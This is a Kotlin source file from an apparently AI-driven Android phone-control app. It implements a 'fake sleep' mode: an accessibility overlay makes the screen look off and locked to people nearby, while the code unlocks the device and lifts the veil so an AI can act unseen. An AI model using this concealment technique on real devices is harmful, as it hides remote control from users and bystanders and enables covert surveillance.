package com.phonehand.app

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Fake sleep — screen looks off/locked to anyone nearby, but AI can still drive the phone.
 * Uses a black accessibility overlay + lock screen; AI briefly lifts the veil per command.
 */
object FakeSleepMode {
    private const val TAG = "FakeSleep"
    private const val PREFS = UserSession.PREFS_NAME
    private const val KEY = "fake_sleep"
    private const val AI_SETTLE_MS = 180L
    private const val AI_WAKE_MS = 260L

    private val mainHandler = Handler(Looper.getMainLooper())

    fun isEnabled(context: Context): Boolean =
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY, false)

    fun setEnabled(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY, enabled)
            .apply()
    }

    fun enable(context: Context, fromProximity: Boolean = false) {
        if (isEnabled(context)) return
        setEnabled(context, true)
        if (fromProximity) ProximityGuard.onProximityFakeSleepChange(true)
        else ProximityGuard.onManualFakeSleepChange(context, true)
        val svc = TouchAccessibilityService.instance
        if (svc == null) {
            Log.w(TAG, "enable: accessibility off")
            return
        }
        mainHandler.post {
            svc.showFakeSleepOverlay()
            svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
        }
        mainHandler.postDelayed({
            if (!ScreenPower.isInteractive(context)) return@postDelayed
            svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
        }, 400)
        DeviceStateReporter.send(context)
        Log.d(TAG, "fake sleep ON")
    }

    fun disable(context: Context, fromProximity: Boolean = false) {
        if (!isEnabled(context)) return
        setEnabled(context, false)
        if (fromProximity) ProximityGuard.onProximityFakeSleepChange(false)
        else ProximityGuard.onManualFakeSleepChange(context, false)
        TouchAccessibilityService.instance?.hideFakeSleepOverlay()
        ScreenPower.wakeScreen(context)
        DeviceStateReporter.send(context)
        Log.d(TAG, "fake sleep OFF")
    }

    fun toggle(context: Context) {
        if (isEnabled(context)) disable(context) else enable(context)
    }

    /** Temporarily lift fake sleep so AI can see and tap the real UI, then restore. */
    fun withAiAccessBlocking(context: Context, block: () -> Unit) {
        val svc = TouchAccessibilityService.instance
        if (svc == null) {
            if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
            block()
            return
        }

        val fakeSleep = isEnabled(context)
        if (fakeSleep) {
            mainHandler.post { svc.hideFakeSleepOverlay() }
            Thread.sleep(60)
            ScreenPower.wakeScreen(context)
            Thread.sleep(AI_WAKE_MS)
            if (LockScreenHelper.isDeviceLocked(context)) {
                LockScreenHelper.unlockBlocking(context, svc)
                Thread.sleep(200)
            }
        } else if (!ScreenPower.isInteractive(context)) {
            ScreenPower.wakeScreen(context)
            Thread.sleep(AI_WAKE_MS)
        }

        try {
            block()
        } finally {
            if (fakeSleep) {
                Thread.sleep(AI_SETTLE_MS)
                mainHandler.post {
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                    svc.showFakeSleepOverlay()
                }
                DeviceStateReporter.send(context)
            }
        }
    }

    fun restoreIfEnabled(context: Context) {
        if (!isEnabled(context)) return
        TouchAccessibilityService.instance?.showFakeSleepOverlay()
    }
}
